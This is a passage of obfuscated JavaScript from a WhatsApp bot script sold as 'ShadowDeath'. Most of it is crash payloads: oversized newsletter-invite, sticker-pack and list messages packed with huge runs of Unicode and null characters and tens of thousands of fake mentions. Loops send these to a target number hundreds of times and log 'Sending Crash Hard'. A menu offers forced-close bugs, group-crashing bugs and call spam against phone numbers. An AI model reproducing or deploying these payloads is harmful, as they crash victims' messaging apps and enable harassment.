        'paymentInviteMessage': {
          'serviceType': "VENMO",
          'expiryTimestamp': Date.now() + 0x134fd9000
        }
      }, {
        'participant': {
          'jid': _0x3b05e7
        }
      });
    }
    async function _0x486d4f(_0xeba4a9) {
      await _0x47285b.relayMessage(_0xeba4a9, {
        'paymentInviteMessage': {
          'serviceType': "CASHAPP",
          'expiryTimestamp': Date.now() + 0x134fd9000
        }
      }, {
        'participant': {
          'jid': _0xeba4a9
        }
      });
    }
    async function _0x52fe39(_0x435a77) {
      try {
        const _0x1db5ea = {
          'botInvokeMessage': {
            'message': {
              'newsletterAdminInviteMessage': {
                'newsletterJid': "33333333333333333@newsletter",
                'newsletterName': "𝐒𝐇𝐀𝐃𝐎𝐖 𝐊𝐈𝐋𝐋 𝐆𝐑𝐎𝐔𝐏" + 'ꦾ'.repeat(0x1d4c0),
                'jpegThumbnail': '',
                'caption': 'ꦽ'.repeat(0x1d4c0) + '@0'.repeat(0x1d4c0),
                'inviteExpiration': Date.now() + 0x6c258c00
              }
            }
          },
          'nativeFlowMessage': {
            'messageParamsJson': '',
            'buttons': [{
              'name': "call_permission_request",
              'buttonParamsJson': '{}'
            }, {
              'name': 'galaxy_message',
              'paramsJson': {
                'screen_2_OptIn_0': true,
                'screen_2_OptIn_1': true,
                'screen_1_Dropdown_0': "nullOnTop",
                'screen_1_DatePicker_1': "1028995200000",
                'screen_1_TextInput_2': "null@gmail.com",
                'screen_1_TextInput_3': '94643116',
                'screen_0_TextInput_0': "\0".repeat(0x7a120),
                'screen_0_TextInput_1': "SecretDocu",
                'screen_0_Dropdown_2': "#926-Xnull",
                'screen_0_RadioButtonsGroup_3': "0_true",
                'flow_token': "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
              }
            }]
          },
          'contextInfo': {
            'mentionedJid': Array.from({
              'length': 0x5
            }, () => "0@s.whatsapp.net"),
            'groupMentions': [{
              'groupJid': "0@s.whatsapp.net",
              'groupSubject': 'Vampire'
            }]
          }
        };
        await _0x47285b.relayMessage(_0x435a77, _0x1db5ea, {
          'userJid': _0x435a77
        });
      } catch (_0x4b054b) {
        console.error("Error sending newsletter:", _0x4b054b);
      }
    }
    async function _0x469aaf(_0x30c066) {
      let _0x1f5145 = [];
      for (let _0x6b10ac = 0x0; _0x6b10ac < 0x3e8; _0x6b10ac++) {
        _0x1f5145.push({
          'fileName': "8kblA1s0k900pbLI6X2S6Y7uSr-r751WIUrQOt5-A3k=.webp",
          'isAnimated': true,
          'accessibilityLabel': '',
          'isLottie': false,
          'mimetype': "image/webp"
        });
      }
      const _0x364522 = {
        'viewOnceMessage': {
          'message': {
            'messageContextInfo': {
              'deviceListMetadata': {},
              'deviceListMetadataVersion': 0x2
            },
            'nativeFlowResponseMessage': {
              'name': "call_permission_request",
              'paramsJson': "\0".repeat(0xf4240),
              'version': 0x3
            },
            'stickerPackMessage': {
              'stickerPackId': '76cd3656-3c76-4109-9b37-62c8a668329f',
              'name': "WOI GRUP KONTOL",
              'publisher': '',
              'stickers': _0x1f5145,
              'fileLength': "999999999999999",
              'fileSha256': 'NURKD/76ZOetxqc+V8dT/zJYRhpHZi9FYgAGNzdQQyM=',
              'fileEncSha256': "/CkFScxebuRGVejPQ8NE0ounWX35rtq+PmkweWejtEs=",
              'mediaKey': "AEkmhMTtPLPha2rHdxtWQtqXBH+g9Jo/+gUw1erHM9s=",
              'directPath': '/v/t62.15575-24/29442218_1217419543131080_7836347641742653699_n.enc?ccb=11-4&oh=01_Q5Aa1QEZWzSJqGIwOUkeDSvpdnDSvVIvGUyVvW_uvgP5uTOePQ&oe=68403E51&_nc_sid=5e03e0',
              'mediaKeyTimestamp': "99999999",
              'trayIconFileName': "e846de1c-ff5f-4768-9ed4-a3ed1c531fe0.png",
              'thumbnailDirectPath': "AjvV1BsQbp1IdsGb4sO/F1O8N6w60Pi2bgimTw/52KU=",
              'thumbnailSha256': "qRcSAXa8fdBBSrYwhAf6Gg7PkjFPbpDqHCo/Keic5O8=",
              'thumbnailEncSha256': "J7OubZTyLsE/VEQ8fRniRwyjB/fMfWbrCxXG0pGkgZ4=",
              'thumbnailHeight': 0x174876e7ff,
              'thumbnailWidth': 0x2540be3ff,
              'imageDataHash': 'OWY2MjQ0MmMzNGFhZThkOTY5YWM2M2RlMzAyNjg0OGNmZTBkMTMwNTBlYmE0YzAxNzhiMDdkMTBiNzM1NzdlYg==',
              'stickerPackSize': 0x9184e729fff,
              'stickerPackOrigin': 0x9184e729fff,
              'contextInfo': {
                'mentionedJid': Array.from({
                  'length': 0x7530
                }, () => '1' + Math.floor(Math.random() * 0x7a120) + "@s.whatsapp.net"),
                'isSampled': true,
                'participant': _0x30c066,
                'remoteJid': _0x30c066,
                'forwardingScore': 0x260d,
                'isForwarded': true,
                'businessMessageForwardInfo': {
                  'businessOwnerJid': _0x30c066
                },
                'externalAdReply': {
                  'title': "𝐒𝐇𝐀𝐃𝐎𝐖 𝐈𝐒 𝐇𝐄𝐑𝐄",
                  'body': "Grup Kontol"
                }
              }
            }
          }
        }
      };
      await _0x47285b.relayMessage(_0x30c066, _0x364522, {});
    }
    async function _0x3e7389(_0x3a6a29, _0x576df9 = true) {
      try {
        const _0x56d567 = {
          'botInvokeMessage': {
            'message': {
              'newsletterAdminInviteMessage': {
                'newsletterJid': '33333333333333333@newsletter',
                'newsletterName': "𝐃𝐄𝐏𝐀𝐘𝐘" + 'ꦾ'.repeat(0x1d4c0),
                'jpegThumbnail': '',
                'caption': 'ꦽ'.repeat(0x1d4c0) + '@9'.repeat(0x1d4c0),
                'inviteExpiration': Date.now() + 0x6c258c00
              }
            }
          },
          'nativeFlowMessage': {
            'messageParamsJson': '',
            'buttons': [{
              'name': "call_permission_request",
              'buttonParamsJson': '{}'
            }, {
              'name': 'galaxy_message',
              'paramsJson': {
                'screen_2_OptIn_0': true,
                'screen_2_OptIn_1': true,
                'screen_1_Dropdown_0': "nullOnTop",
                'screen_1_DatePicker_1': '1028995200000',
                'screen_1_TextInput_2': 'null@gmail.com',
                'screen_1_TextInput_3': "94643116",
                'screen_0_TextInput_0': "".repeat(0xc350),
                'screen_0_TextInput_1': "SecretDocu",
                'screen_0_Dropdown_2': "#926-Xnull",
                'screen_0_RadioButtonsGroup_3': "0_true",
                'flow_token': "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
              }
            }]
          },
          'contextInfo': {
            'mentionedJid': Array.from({
              'length': 0x5
            }, () => '0@s.whatsapp.net'),
            'groupMentions': [{
              'groupJid': "0@s.whatsapp.net",
              'groupSubject': "Vampire Official"
            }]
          }
        };
        await _0x47285b.relayMessage(_0x3a6a29, _0x56d567, {
          'userJid': _0x3a6a29
        });
      } catch (_0x18872d) {
        console.error("Error sending newsletter:", _0x18872d);
      }
    }
    async function _0x5f2021(_0xd2be1e) {
      for (let _0x547c08 = 0x0; _0x547c08 <= 0x348; _0x547c08++) {
        await _0xa8e712(_0xd2be1e);
        await _0x4a5bda(_0xd2be1e);
        await _0x3eda37(_0xd2be1e);
        await _0x27e6f4(_0xd2be1e, true);
        await _0x4fe54c(_0xd2be1e, true);
        await {
          'viewOnceMessage': {
            'message': {
              'listResponseMessage': {
                'title': "PL TESTING" + "ê¦½".repeat(0xafc8),
                'listType': 0x2,
                'singleSelectReply': {
                  'selectedRowId': "ðŸ©¸"
                },
                'contextInfo': {
                  'stanzaId': crypto.randomBytes(0x10).toString("hex"),
                  'participant': "0@s.whatsapp.net",
                  'remoteJid': "status@broadcast",
                  'mentionedJid': [_0xd2be1e],
                  'quotedMessage': {
                    'buttonsMessage': {
                      'documentMessage': {
                        'url': "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        'mimetype': "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        'fileSha256': '+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=',
                        'fileLength': '9999999999999',
                        'pageCount': 0xd4a50fff,
                        'mediaKey': "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        'fileName': 'PL',
                        'fileEncSha256': "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        'directPath': '/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0',
                        'mediaKeyTimestamp': "1735456100",
                        'contactVcard': true,
                        'caption': "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi"
                      },
                      'contentText': "à¼‘ Fail Beta - ( devorsixcore ) \"ðŸ‘‹\"",
                      'footerText': "Â© running since 2020 to 20##?",
                      'buttons': [{
                        'buttonId': "\0".repeat(0xdbba0),
                        'buttonText': {
                          'displayText': "ðŽŸ ð“ðâ€Œð— â¿» ð‚â€Œð‹ð¢ðšµâ€Œðð“â€Œ ðŽŸ"
                        },
                        'type': 0x1
                      }],
                      'headerType': 0x3
                    }
                  },
                  'conversionSource': "porn",
                  'conversionData': crypto.randomBytes(0x10),
                  'conversionDelaySeconds': 0x270f,
                  'forwardingScore': 0xf423f,
                  'isForwarded': true,
                  'quotedAd': {
                    'advertiserName': " x ",
                    'mediaType': "IMAGE",
                    'jpegThumbnail': null,
                    'caption': " x "
                  },
                  'placeholderKey': {
                    'remoteJid': "0@s.whatsapp.net",
                    'fromMe': false,
                    'id': "ABCDEF1234567890"
                  },
                  'expiration': -0x1869f,
                  'ephemeralSettingTimestamp': Date.now(),
                  'ephemeralSharedSecret': crypto.randomBytes(0x10),
                  'entryPointConversionSource': "kontols",
                  'entryPointConversionApp': 'kontols',
                  'actionLink': {
                    'url': "t.me/jackthexbec",
                    'buttonTitle': "konstol"
                  },
                  'disappearingMode': {
                    'initiator': 0x1,
                    'trigger': 0x2,
                    'initiatorDeviceJid': _0xd2be1e,
                    'initiatedByMe': true
                  },
                  'groupSubject': "kontol",
                  'parentGroupJid': "kontolll",
                  'trustBannerType': "kontol",
                  'trustBannerAction': 0x1869f,
                  'isSampled': true,
                  'externalAdReply': {
                    'title': 'Î›Æ§Î‰BÓ¨Ð¯ÐŸ',
                    'mediaType': 0x2,
                    'renderLargerThumbnail': false,
                    'showAdAttribution': false,
                    'containsAutoReply': false,
                    'body': "IÆ§ Î›á„‚IVÎ£",
                    'thumbnail': null,
                    'sourceUrl': "go fuck yourself",
                    'sourceId': "dvx - problem",
                    'ctwaClid': "cta",
                    'ref': "ref",
                    'clickToWhatsappCall': true,
                    'automatedGreetingMessageShown': false,
                    'greetingMessageBody': 'kontol',
                    'ctaPayload': "cta",
                    'disableNudge': true,
                    'originalImageUrl': "konstol"
                  },
                  'featureEligibilities': {
                    'cannotBeReactedTo': true,
                    'cannotBeRanked': true,
                    'canRequestFeedback': true
                  },
                  'forwardedNewsletterMessageInfo': {
                    'newsletterJid': '120363274419384848@newsletter',
                    'serverMessageId': 0x1,
                    'newsletterName': "TrashDex ð–£‚      - ã€½" + "ê¥ˆê¥ˆê¥ˆê¥ˆê¥ˆê¥ˆ".repeat(0xa),
                    'contentType': 0x3,
                    'accessibilityText': "kontol"
                  },
                  'statusAttributionType': 0x2,
                  'utm': {
                    'utmSource': 'utm',
                    'utmCampaign': "utm2"
                  }
                },
                'description': "PL TESTING"
              },
              'messageContextInfo': {
                'messageSecret': crypto.randomBytes(0x20),
                'supportPayload': JSON.stringify({
                  'version': 0x2,
                  'is_ai_message': true,
                  'should_show_system_message': true,
                  'ticket_id': crypto.randomBytes(0x10)
                })
              }
            }
          }
        };
        await _0x52fe39(_0xd2be1e);
      }
      console.log(chalk.blue("Sending Crash Hard to " + _0xd2be1e + '☠️'));
    }
    async function _0x2bc7bb(_0x204e8a) {
      for (let _0x32fc27 = 0x0; _0x32fc27 <= 0x64; _0x32fc27++) {
        await _0xa8e712(_0x204e8a);
        await _0x4a5bda(_0x204e8a);
        await _0x3eda37(_0x204e8a);
        await {
          'viewOnceMessage': {
            'message': {
              'listResponseMessage': {
                'title': "PL TESTING" + "ê¦½".repeat(0xafc8),
                'listType': 0x2,
                'singleSelectReply': {
                  'selectedRowId': "ðŸ©¸"
                },
                'contextInfo': {
                  'stanzaId': crypto.randomBytes(0x10).toString("hex"),
                  'participant': "0@s.whatsapp.net",
                  'remoteJid': "status@broadcast",
                  'mentionedJid': [_0x204e8a],
                  'quotedMessage': {
                    'buttonsMessage': {
                      'documentMessage': {
                        'url': "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        'mimetype': "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        'fileSha256': '+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=',
                        'fileLength': '9999999999999',
                        'pageCount': 0xd4a50fff,
                        'mediaKey': "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        'fileName': 'PL',
                        'fileEncSha256': "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        'directPath': '/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0',
                        'mediaKeyTimestamp': "1735456100",
                        'contactVcard': true,
                        'caption': "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi"
                      },
                      'contentText': "à¼‘ Fail Beta - ( devorsixcore ) \"ðŸ‘‹\"",
                      'footerText': "Â© running since 2020 to 20##?",
                      'buttons': [{
                        'buttonId': "\0".repeat(0xdbba0),
                        'buttonText': {
                          'displayText': "ðŽŸ ð“ðâ€Œð— â¿» ð‚â€Œð‹ð¢ðšµâ€Œðð“â€Œ ðŽŸ"
                        },
                        'type': 0x1
                      }],
                      'headerType': 0x3
                    }
                  },
                  'conversionSource': "porn",
                  'conversionData': crypto.randomBytes(0x10),
                  'conversionDelaySeconds': 0x270f,
                  'forwardingScore': 0xf423f,
                  'isForwarded': true,
                  'quotedAd': {
                    'advertiserName': " x ",
                    'mediaType': "IMAGE",
                    'jpegThumbnail': null,
                    'caption': " x "
                  },
                  'placeholderKey': {
                    'remoteJid': "0@s.whatsapp.net",
                    'fromMe': false,
                    'id': "ABCDEF1234567890"
                  },
                  'expiration': -0x1869f,
                  'ephemeralSettingTimestamp': Date.now(),
                  'ephemeralSharedSecret': crypto.randomBytes(0x10),
                  'entryPointConversionSource': "kontols",
                  'entryPointConversionApp': 'kontols',
                  'actionLink': {
                    'url': "t.me/jackthexbec",
                    'buttonTitle': "konstol"
                  },
                  'disappearingMode': {
                    'initiator': 0x1,
                    'trigger': 0x2,
                    'initiatorDeviceJid': _0x204e8a,
                    'initiatedByMe': true
                  },
                  'groupSubject': "kontol",
                  'parentGroupJid': "kontolll",
                  'trustBannerType': "kontol",
                  'trustBannerAction': 0x1869f,
                  'isSampled': true,
                  'externalAdReply': {
                    'title': 'Î›Æ§Î‰BÓ¨Ð¯ÐŸ',
                    'mediaType': 0x2,
                    'renderLargerThumbnail': false,
                    'showAdAttribution': false,
                    'containsAutoReply': false,
                    'body': "IÆ§ Î›á„‚IVÎ£",
                    'thumbnail': null,
                    'sourceUrl': "go fuck yourself",
                    'sourceId': "dvx - problem",
                    'ctwaClid': "cta",
                    'ref': "ref",
                    'clickToWhatsappCall': true,
                    'automatedGreetingMessageShown': false,
                    'greetingMessageBody': 'kontol',
                    'ctaPayload': "cta",
                    'disableNudge': true,
                    'originalImageUrl': "konstol"
                  },
                  'featureEligibilities': {
                    'cannotBeReactedTo': true,
                    'cannotBeRanked': true,
                    'canRequestFeedback': true
                  },
                  'forwardedNewsletterMessageInfo': {
                    'newsletterJid': '120363274419384848@newsletter',
                    'serverMessageId': 0x1,
                    'newsletterName': "TrashDex ð–£‚      - ã€½" + "ê¥ˆê¥ˆê¥ˆê¥ˆê¥ˆê¥ˆ".repeat(0xa),
                    'contentType': 0x3,
                    'accessibilityText': "kontol"
                  },
                  'statusAttributionType': 0x2,
                  'utm': {
                    'utmSource': 'utm',
                    'utmCampaign': "utm2"
                  }
                },
                'description': "PL TESTING"
              },
              'messageContextInfo': {
                'messageSecret': crypto.randomBytes(0x20),
                'supportPayload': JSON.stringify({
                  'version': 0x2,
                  'is_ai_message': true,
                  'should_show_system_message': true,
                  'ticket_id': crypto.randomBytes(0x10)
                })
              }
            }
          }
        };
        await _0x27e6f4(_0x204e8a, true);
        await _0x4fe54c(_0x204e8a, true);
      }
      console.log(chalk.blue("Sending Crash Hard to " + _0x204e8a + '☠️'));
    }
    _0x47285b.sendFile = async (_0x23eed4, _0x163bc7, _0x4bc2a6 = '', _0x3e1969 = '', _0x43949a, _0x2eb44b = false, _0x3e69dc = {}) => {
      let _0x2ed15b = await _0x47285b.getFile(_0x163bc7, true);
      let {
        res: _0x52bbc6,
        data: _0x9366ef,
        filename: _0x2902ea
      } = _0x2ed15b;
      if (_0x52bbc6 && _0x52bbc6.status !== 0xc8 || _0x9366ef.length <= 0x10000) {
        try {
          throw {
            'json': JSON.parse(_0x9366ef.toString())
          };
        } catch (_0x1fb1c3) {
          if (_0x1fb1c3.json) {
            throw _0x1fb1c3.json;
          }
        }
      }
      let _0x390ff2 = {
        'filename': _0x4bc2a6
      };
      if (_0x43949a) {
        _0x390ff2.quoted = _0x43949a;
      }
      if (!_0x2ed15b) {
        _0x3e69dc.asDocument = true;
      }
      let _0x1b27d6 = '';
      let _0x4be984 = _0x2ed15b.mime;
      let _0x31882d;
      if (/webp/.test(_0x2ed15b.mime) || /image/.test(_0x2ed15b.mime) && _0x3e69dc.asSticker) {
        _0x1b27d6 = "sticker";
      } else {
        if (/image/.test(_0x2ed15b.mime) || /webp/.test(_0x2ed15b.mime) && _0x3e69dc.asImage) {
          _0x1b27d6 = "image";
        } else {
          if (/video/.test(_0x2ed15b.mime)) {
            _0x1b27d6 = "video";
          } else {
            if (/audio/.test(_0x2ed15b.mime)) {
              _0x31882d = await (_0x2eb44b ? toPTT : toAudio)(_0x9366ef, _0x2ed15b.ext);
              _0x9366ef = _0x31882d.data;
              _0x2902ea = _0x31882d.filename;
              _0x1b27d6 = "audio";
              _0x4be984 = "audio/ogg; codecs=opus";
            } else {
              _0x1b27d6 = "document";
            }
          }
        }
      }
      if (_0x3e69dc.asDocument) {
        _0x1b27d6 = "document";
      }
      delete _0x3e69dc.asSticker;
      delete _0x3e69dc.asLocation;
      delete _0x3e69dc.asVideo;
      delete _0x3e69dc.asDocument;
      delete _0x3e69dc.asImage;
      let _0x1a9256 = {
        ..._0x3e69dc,
        'caption': _0x3e1969,
        'ptt': _0x2eb44b,
        [_0x1b27d6]: {
          'url': _0x2902ea
        },
        'mimetype': _0x4be984
      };
      let _0xa282c3;
      try {
        _0xa282c3 = await _0x47285b.sendMessage(_0x23eed4, _0x1a9256, {
          ..._0x390ff2,
          ..._0x3e69dc
        });
      } catch (_0x3e4e52) {
        _0xa282c3 = null;
      } finally {
        if (!_0xa282c3) {
          _0xa282c3 = await _0x47285b.sendMessage(_0x23eed4, {
            ..._0x1a9256,
            [_0x1b27d6]: _0x9366ef
          }, {
            ..._0x390ff2,
            ..._0x3e69dc
          });
        }
        _0x9366ef = null;
        return _0xa282c3;
      }
    };
    const _0xcc406d = async (_0x46e5e7, _0x51a21d = []) => {
      let _0x3ff686 = await prepareWAMessageMedia({
        'image': {
          'url': global.image.logo
        }
      }, {
        'upload': _0x47285b.waUploadToServer
      });
      const _0x3992a1 = await generateWAMessageFromContent(_0x46e5e7, {
        'ephemeralMessage': {
          'message': {
            'messageContextInfo': {
              'deviceListMetadata': {},
              'deviceListMetadataVersion': 0x2
            },
            'interactiveMessage': proto.Message.InteractiveMessage.fromObject({
              'body': proto.Message.InteractiveMessage.Body.fromObject({
                'text': "*All Transaksi Open ✅*\n\n*DepayOffc* Menyediakan Produk & Jasa Dibawah Ini ⬇️"
              }),
              'contextInfo': {
                'mentionedJid': _0x51a21d
              },
              'carouselMessage': proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                'cards': [{
                  'header': proto.Message.InteractiveMessage.Header.fromObject({
                    'title': "*Vynx Menyediakan*\n- *Panel Pterodactyl Server Private*\n- *Panel Pterodactyl Server Pubclic*\n- *Script Bot WhatsApp*\n- *SubDomain (Request Nama Domain)*\n- *Nokos WhatsApp All Region (Tergantung Stok!)*\n- *Jasa Install Panel Pterodactyl*\n-  *Dan Lain Lain Langsung Tanyakan Saja.*",
                    'hasMediaAttachment': true,
                    ..._0x3ff686
                  }),
                  'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                    'buttons': [{
                      'name': 'cta_url',
                      'buttonParamsJson': "{\"display_text\":\"Chat Penjual\",\"url\":\"" + global.linkOwner + "\",\"merchant_url\":\"https://www.google.com\"}"
                    }]
                  })
                }, {
                  'header': proto.Message.InteractiveMessage.Header.fromObject({
                    'title': "*Bantu Join Grup*\n- *Grup :*\nhttps://chat.whatsapp.com/HUpvqjEvkhI5ujzdilZQFC",
                    'hasMediaAttachment': true,
                    ..._0x3ff686
                  }),
                  'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                    'buttons': [{
                      'name': 'cta_url',
                      'buttonParamsJson': "{\"display_text\":\"Chat Penjual\",\"url\":\"" + global.linkOwner + "\",\"merchant_url\":\"https://www.google.com\"}"
                    }]
                  })
                }]
              })
            })
          }
        }
      }, {
        'userJid': _0x2f6673.sender,
        'quoted': _0x1db9d5
      });
      await _0x47285b.relayMessage(_0x46e5e7, _0x3992a1.message, {
        'messageId': _0x3992a1.key.id
      });
    };
    switch (_0x4345b8) {
      case 'shd':
        {
          let _0x205bc9 = [{
            'buttonId': ".owner",
            'buttonText': {
              'displayText': "▢ 𝗗͢𝗲͠𝘃𝗲𝗹𝗼͠𝗽𝗲𝗿͢ 𝗦͠𝗰𝗿𝗶𝗽𝘁"
            }
          }, {
            'buttonId': ".tqto",
            'buttonText': {
              'displayText': "▢ †q†ð"
            }
          }];
          let _0x2e6474 = {
            'image': {
              'url': 'https://img1.pixhost.to/images/6076/604844054_vynx.jpg'
            },
            'caption': "Whatshapp Broo👋, I'm 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊 Script Whatsapp Bot Create By 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊 \n`[ 𝗦𝗵𝗮𝗱𝗼𝘄𝗗𝗲𝗮𝘁𝗵 𝗜𝗻𝗳𝗼 ]`\n𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊\n𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 : 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊\n𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 4 Vip\n𝗦𝘁𝗮𝘁𝘂𝘀 : Vip Buy Only!! \n𝗦𝗶𝘁𝗲 : https.íd.co/VynxOfficial\n",
            'contextInfo': {
              'externalAdReply': {
                'showAdAttribution': true,
                'title': "𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊",
                'body': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'sourceUrl': " ",
                'mediaType': 0x1,
                'renderLargerThumbnail': false
              }
            },
            'footer': '𝗦𝗵𝗮𝗱𝗼𝘄𝗗𝗲𝗮𝘁𝗵𝗩𝗲𝗿𝘀𝗶𝗼𝗻𝟰',
            'buttons': _0x205bc9,
            'viewOnce': true,
            'headerType': 0x6
          };
          const _0x145013 = {
            'buttonId': "action",
            'buttonText': {
              'displayText': "This Button List"
            },
            'type': 0x4,
            'nativeFlowInfo': {
              'name': "single_select",
              'paramsJson': JSON.stringify({
                'title': "List Menu",
                'sections': [{
                  'title': "𝗟𝗶𝘀𝘁 𝗠𝗲𝗻𝘂 𝗕𝗼𝘁",
                  'highlight_label': "Attack Whatsapp 🕊",
                  'rows': [{
                    'title': "BugMenu",
                    'description': "Shadow Attack Whatsapp🕊",
                    'id': '.bugmenu'
                  }, {
                    'title': 'MainMenu',
                    'description': "List FunMenu🛠",
                    'id': '.funmenu'
                  }, {
                    'title': 'Searchmenu',
                    'description': "List Search Menu 🔍",
                    'id': ".smenu"
                  }, {
                    'title': "Toolsmenu",
                    'description': "List Toolsmenu👾",
                    'id': ".toolsmenu"
                  }, {
                    'title': "Buy Script",
                    'description': "Buy Scrpit. Death🛍️",
                    'id': ".sc"
                  }, {
                    'title': "Downloadmenu",
                    'description': "List Downloadmenu📥",
                    'id': ".downloadmenu"
                  }, {
                    'title': "Storemenu",
                    'description': "List Storemenu🛒",
                    'id': ".storemenu"
                  }, {
                    'title': "Groupmenu",
                    'description': "List Groupmenu🏘",
                    'id': '.grupmenu'
                  }, {
                    'title': "Ownermenu",
                    'description': "Ownermenu👤",
                    'id': ".ownermenu"
                  }]
                }]
              })
            },
            'viewOnce': true
          };
          _0x2e6474.buttons.push(_0x145013);
          await _0x47285b.sendMessage(_0x2f6673.chat, _0x2e6474, {
            'quoted': _0x5560b2
          });
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'audio': fs.readFileSync("./image/musik1.mp3"),
            'mimetype': "audio/mpeg",
            'ptt': true
          }, {
            'quoted': _0x2f6673
          });
        }
        break;
      case "bugmenu":
        {
          let _0x568e31 = [{
            'buttonId': ".owner",
            'buttonText': {
              'displayText': "▢ 𝗗͢𝗲͠𝘃𝗲𝗹𝗼͠𝗽𝗲𝗿͢ 𝗦͠𝗰𝗿𝗶𝗽𝘁"
            }
          }, {
            'buttonId': ".tqto",
            'buttonText': {
              'displayText': "▢ †q†ð"
            }
          }];
          let _0x5ed2b0 = {
            'image': {
              'url': "https://img1.pixhost.to/images/6076/604845474_vynx.jpg"
            },
            'caption': "Whatshapp Broo👋, I'm 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊 Script Whatsapp Bot Create By 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊 \n`[ 𝗦𝗵𝗮𝗱𝗼𝘄𝗗𝗲𝗮𝘁𝗵 𝗜𝗻𝗳𝗼 ]`\n𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊\n𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 : 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊\n𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 4 Vip\n𝗦𝘁𝗮𝘁𝘂𝘀 : Vip Buy Only!! \n𝗦𝗶𝘁𝗲 : https.íd.co/VynxOfficial\n\n`[ 𝗣𝗿𝗶𝘃𝗮𝘁𝗲 𝗕𝘂𝗴 ]`\n◇ .shadow 628xxx [ Button Bug ]\n◇ .xvshadow 628xxx [ Forclose Bug ]\n◇ .shadow-force 628xxx [ Forclose Hard ]\n◇ .invis-vx 628xxx [ Delay Invis ]\n◇ .invis-shadow 628xxx [ Delay Hard ]\n\n`[ 𝗕𝘂𝗴 𝗚𝗿𝗼𝘂𝗽 ]`\n◇ .vynx-blankgroup [ Link Group ]\n◇ .shadow-deathgroup [ Link Group ]\n\n`[ 𝗦𝗽𝗮𝗺 𝗖𝗮𝗹𝗹 ]`\n◇ .brutalspam 628xxx [ Spam Telepon ]\n",
            'contextInfo': {
              'externalAdReply': {
                'showAdAttribution': true,
                'title': "𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊",
                'body': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'sourceUrl': " ",
                'mediaType': 0x1,
                'renderLargerThumbnail': false
              }
            },
            'footer': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
            'buttons': _0x568e31,
            'viewOnce': true,
            'headerType': 0x6
          };
          const _0x32fb3f = {
            'buttonId': "action",
            'buttonText': {
              'displayText': "This Button List"
            },
            'type': 0x4,
            'nativeFlowInfo': {
              'name': "single_select",
              'paramsJson': JSON.stringify({
                'title': "List Menu",
                'sections': [{
                  'title': "𝗟𝗶𝘀𝘁 𝗠𝗲𝗻𝘂 𝗕𝗼𝘁",
                  'highlight_label': "Attack Whatsapp 🕊",
                  'rows': [{
                    'title': "BugMenu",
                    'description': "shadow Attack Whatsapp🕊",
                    'id': ".bugmenu"
                  }, {
                    'title': "MainMenu",
                    'description': "List FunMenu🛠",
                    'id': ".funmenu"
                  }, {
                    'title': "Searchmenu",
                    'description': "List Search Menu 🔍",
                    'id': ".smenu"
                  }, {
                    'title': "Toolsmenu",
                    'description': "List Toolsmenu👾",
                    'id': ".toolsmenu"
                  }, {
                    'title': "Buy Script",
                    'description': "Buy Scrpit. Shadow🛍️",
